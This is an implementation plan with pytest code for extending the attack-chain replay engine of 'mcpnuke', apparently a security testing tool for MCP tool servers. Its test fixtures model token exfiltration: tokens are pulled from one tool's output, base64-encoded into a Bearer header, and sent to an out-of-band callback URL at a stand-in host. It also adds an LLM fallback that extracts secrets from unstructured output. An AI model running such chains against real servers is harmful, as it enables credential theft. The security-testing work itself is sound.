# Multi-Hop Attack Chain Replay Enhancements Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Enhance the `--chain-replay` engine with field-aware JSON path extraction, transform filters, tracked fragment data-movement detection, OAST exfiltration payload correlation, and dynamic LLM parameter extraction fallback.

**Architecture:**
1. Extend placeholder parsing in `mcpnuke/core/chain_replay.py` to support `{{stepN.output.path.to.key|filter}}` with safe AST-like traversal and transform filters (`b64`, `b64decode`, `urlencode`, `urldecode`, `strip`, `json`).
2. Implement `tracked_fragments` in `ChainRun` to record extracted and transformed tokens ($\ge 4$ chars) and check them in both `_data_moved` (in-band) and `summarize_run` (out-of-band OAST payload matching).
3. Implement `_dynamic_extract_arg` to fall back to LLM extraction when deterministic path evaluation fails on unstructured tool output.
4. Wire backend and options through `replay_chain` in `mcpnuke/checks/llm_analysis.py`.

**Tech Stack:** Python 3.11+, standard library (`base64`, `urllib.parse`, `json`, `re`), pytest, ruff, mypy.

---

### Task 1: Field-Aware JSON Path Extraction and Transform Filters

**Files:**
- Modify: `mcpnuke/core/chain_replay.py`
- Create: `tests/test_chain_replay_transforms.py`

- [ ] **Step 1: Write the failing unit tests for JSON path extraction and transform filters**

Create `tests/test_chain_replay_transforms.py`:
```python
"""Tests for JSON-path extraction and transform filters in attack chain replay."""

from mcpnuke.core.chain_replay import (
    StepResult,
    _extract_path,
    _apply_filter,
    _substitute,
)


def test_extract_path_nested_dict_and_list():
    data = {
        "user": {
            "profile": {
                "name": "alice",
                "tokens": [{"id": "tok_123", "value": "secret_abc"}]
            }
        }
    }
    assert _extract_path(data, "user.profile.name") == "alice"
    assert _extract_path(data, "user.profile.tokens[0].value") == "secret_abc"
    assert _extract_path(data, "user.profile.nonexistent") is None


def test_extract_path_from_json_string_with_fences():
    text = '```json\n{"status": "success", "data": {"api_key": "live_key_999"}}\n```'
    assert _extract_path(text, "data.api_key") == "live_key_999"


def test_apply_filter_transforms():
    assert _apply_filter("hello world", "b64") == "aGVsbG8gd29ybGQ="
    assert _apply_filter("aGVsbG8gd29ybGQ=", "b64decode") == "hello world"
    assert _apply_filter("admin user&key=1", "urlencode") == "admin%20user%26key%3D1"
    assert _apply_filter("admin%20user%26key%3D1", "urldecode") == "admin user&key=1"
    assert _apply_filter("  trimmed  \n", "strip") == "trimmed"
    assert _apply_filter({"a": 1}, "json") == '{"a": 1}'


def test_substitute_with_extended_placeholder():
    prior = [
        StepResult(
            tool="get_keys",
            request_args={},
            response_text='{"auth": {"token": "SECRET_SESSION_TOKEN"}}',
            failed=False,
        )
    ]
    template = "Bearer {{step0.output.auth.token|b64}}"
    res, fragments = _substitute(template, prior)
    assert res == "Bearer U0VDUkVUX1NFU1NJT05fVE9LRU4="
    assert "SECRET_SESSION_TOKEN" in fragments
    assert "U0VDUkVUX1NFU1NJT05fVE9LRU4=" in fragments
```

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/test_chain_replay_transforms.py -v`
Expected: FAIL (`ImportError: cannot import name '_extract_path'`).

- [ ] **Step 3: Implement JSON-path extractor, filter pipeline, and extended substitution in `mcpnuke/core/chain_replay.py`**

In `mcpnuke/core/chain_replay.py`:
- Update `_PLACEHOLDER_RE` to match `r"\{\{step(\d+)\.output(?:\.([a-zA-Z0-9_.\[\]]+))?(?:\|([a-zA-Z0-9_]+))?\}\}"`.
- Implement `_extract_path(data: Any, path: str) -> Any`.
- Implement `_apply_filter(value: Any, filter_name: str) -> str`.
- Update `_substitute` to parse path + filter and accumulate resolved values into `tracked_fragments`.
- Update `_resolve_args` to pass `tracked_fragments`.

- [ ] **Step 4: Run test to verify it passes**

Run: `uv run pytest tests/test_chain_replay_transforms.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add mcpnuke/core/chain_replay.py tests/test_chain_replay_transforms.py
git commit -m "feat: add json-path extraction and transform filters to chain replay"
```

---

### Task 2: Tracked Fragment Registration & Verified In-Band / OAST Data Movement

**Files:**
- Modify: `mcpnuke/core/chain_replay.py`
- Modify: `tests/test_chain_replay_transforms.py`

- [ ] **Step 1: Write the failing tests for data movement with extracted/transformed fragments and OAST correlation**

Add tests to `tests/test_chain_replay_transforms.py`:
```python
from mcpnuke.core.chain_replay import (
    ChainRun,
    ChainStep,
    ProposedChain,
    _data_moved,
    summarize_run,
)
from mcpnuke.core.oast import CanaryCallback, CanaryListener


def test_data_moved_detects_extracted_and_transformed_fragments():
    chain = ProposedChain(
        title="Token Exfil",
        steps=[
            ChainStep(tool="get_creds", args={}),
            ChainStep(tool="send_data", args={"header": "Bearer {{step0.output.token|b64}}"}),
        ],
    )
    run = ChainRun(chain=chain)
    run.tracked_fragments.extend(["SECRET_TOKEN_XYZ", "U0VDUkVUX1RPS0VOX1hZWg=="])
    run.results = [
        StepResult(
            tool="get_creds",
            request_args={},
            response_text='{"token": "SECRET_TOKEN_XYZ"}',
            failed=False,
        ),
        StepResult(
            tool="send_data",
            request_args={"header": "Bearer U0VDUkVUX1RPS0VOX1hZWg=="},
            response_text="ok",
            failed=False,
        ),
    ]
    moves = _data_moved(run)
    assert len(moves) == 1
    assert moves[0][0] == 0
    assert moves[0][1] == 1
    assert "U0VDUkVUX1RPS0VOX1hZWg==" in moves[0][2] or "SECRET_TOKEN_XYZ" in moves[0][2]


def test_oast_summary_verifies_exfiltrated_payload():
    chain = ProposedChain(
        title="OAST Exfil",
        steps=[
            ChainStep(tool="read_token", args={}),
            ChainStep(tool="fetch", args={"url": "{{oast.url}}?data={{step0.output.token}}"}),
        ],
    )
    run = ChainRun(chain=chain, oast_token="oast_tok_123")
    run.tracked_fragments.append("SUPER_SECRET_VALUE")
    run.results = [
        StepResult(tool="read_token", request_args={}, response_text='{"token": "SUPER_SECRET_VALUE"}', failed=False),
        StepResult(tool="fetch", request_args={"url": "http://oast.test/oast_tok_123?data=SUPER_SECRET_VALUE"}, response_text="fetched", failed=False),
    ]

    class MockOAST:
        def await_hits(self, token, wait=2.0):
            return [
                CanaryCallback(
                    token="oast_tok_123",
                    peer="127.0.0.1",
                    method="GET",
                    path="/oast_tok_123?data=SUPER_SECRET_VALUE",
                    headers={},
                    body="",
                    time=100.0,
                )
            ]

    verdict = summarize_run(run, oast=MockOAST())
    assert verdict.reproduced
    assert verdict.egress_confirmed
    assert "exfiltrated data" in verdict.detail.lower()
    assert "SUPER_SECRET_VALUE" in verdict.evidence
```

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/test_chain_replay_transforms.py::test_data_moved_detects_extracted_and_transformed_fragments -v`
Expected: FAIL.

- [ ] **Step 3: Update `_data_moved` and `summarize_run` in `mcpnuke/core/chain_replay.py`**

- In `ChainRun`: ensure `tracked_fragments: list[str] = field(default_factory=list)`.
- In `_data_moved`: check both `source.response_text` and `run.tracked_fragments` against sink `request_args`.
- In `summarize_run`: when `callbacks` exist, match `run.tracked_fragments` in callback path, query, and body. Report exfiltrated fragment in evidence when found.

- [ ] **Step 4: Run test to verify it passes**

Run: `uv run pytest tests/test_chain_replay_transforms.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add mcpnuke/core/chain_replay.py tests/test_chain_replay_transforms.py
git commit -m "feat: track extracted fragments for in-band and oast chain verification"
```

---

### Task 3: Dynamic LLM Step Parameter Adaptation Fallback

**Files:**
- Modify: `mcpnuke/core/chain_replay.py`
- Modify: `mcpnuke/checks/llm_analysis.py`
- Modify: `tests/test_chain_replay_transforms.py`

- [ ] **Step 1: Write the failing tests for dynamic LLM parameter extraction**

Add to `tests/test_chain_replay_transforms.py`:
```python
from unittest.mock import MagicMock
from mcpnuke.core.chain_replay import replay_chain


def test_dynamic_step_adaptation_fallback():
    class FakeSession:
        def call(self, method, params, timeout=10.0):
            if params["name"] == "get_unstructured":
                return {"result": {"content": [{"type": "text", "text": "Successfully created user session: token=DYNAMIC_SECRET_777"}]}}
            return {"result": {"content": [{"type": "text", "text": "received"}]}}

    tools = {
        "get_unstructured": {"name": "get_unstructured", "inputSchema": {}},
        "use_token": {
            "name": "use_token",
            "inputSchema": {
                "type": "object",
                "properties": {"session_token": {"type": "string", "description": "Session token"}},
                "required": ["session_token"]
            }
        }
    }
    chain = ProposedChain(
        title="Dynamic Extraction Chain",
        steps=[
            ChainStep(tool="get_unstructured", args={}),
            ChainStep(tool="use_token", args={"session_token": "{{step0.output.token}}"}),
        ]
    )

    class FakeBackend:
        def _call(self, system, user, max_tokens=300, log=None):
            return "DYNAMIC_SECRET_777"

    run = replay_chain(FakeSession(), chain, tools, backend=FakeBackend())
    assert run.completed
    assert run.results[1].request_args["session_token"] == "DYNAMIC_SECRET_777"
    assert "DYNAMIC_SECRET_777" in run.tracked_fragments
```

- [ ] **Step 2: Run test to verify it fails**

Run: `uv run pytest tests/test_chain_replay_transforms.py::test_dynamic_step_adaptation_fallback -v`
Expected: FAIL (`unexpected keyword argument 'backend'`).

- [ ] **Step 3: Implement dynamic parameter extraction fallback**

- In `mcpnuke/core/chain_replay.py`:
  - Implement `_dynamic_extract_arg(backend: Any, tool_name: str, param_name: str, param_desc: str, source_text: str, model: str = "", log: Any = None) -> str | None`.
  - In `replay_chain`, accept `backend: Any = None, model: str = "", log: Any = None`.
  - Pass backend context to `_resolve_args` and `_substitute`. If path resolution returns `None` on a non-empty step response, invoke `_dynamic_extract_arg` to extract the required parameter value.
- In `mcpnuke/checks/llm_analysis.py`:
  - Pass `backend=backend, model=model, log=log` in `_replay_with_retries`.

- [ ] **Step 4: Run test to verify it passes**

Run: `uv run pytest tests/test_chain_replay_transforms.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add mcpnuke/core/chain_replay.py mcpnuke/checks/llm_analysis.py tests/test_chain_replay_transforms.py
git commit -m "feat: add dynamic llm parameter extraction fallback to chain replay"
```

---

### Task 4: Full Suite Verification, Lint, Typing & Regression Check

**Files:**
- None (verification & test suite run)

- [ ] **Step 1: Run all chain replay tests**

Run: `uv run pytest tests/test_chain_replay*.py -v`
Expected: PASS across all replay test suites.

- [ ] **Step 2: Run full test suite**

Run: `uv run pytest tests/ -v`
Expected: 1610+ passed, 48 skipped, 0 failed.

- [ ] **Step 3: Run linter and typechecker**

Run: `uv run ruff check .`
Run: `uv run mypy mcpnuke/`
Expected: 0 ruff errors, mypy error count $\le 30$.

- [ ] **Step 4: Update Documentation / Changelog**

Update `CHANGELOG.md` with the new multi-hop replay features and commit.
```bash
git add CHANGELOG.md
git commit -m "docs: document multi-hop replay transforms and dynamic adaptation"
```
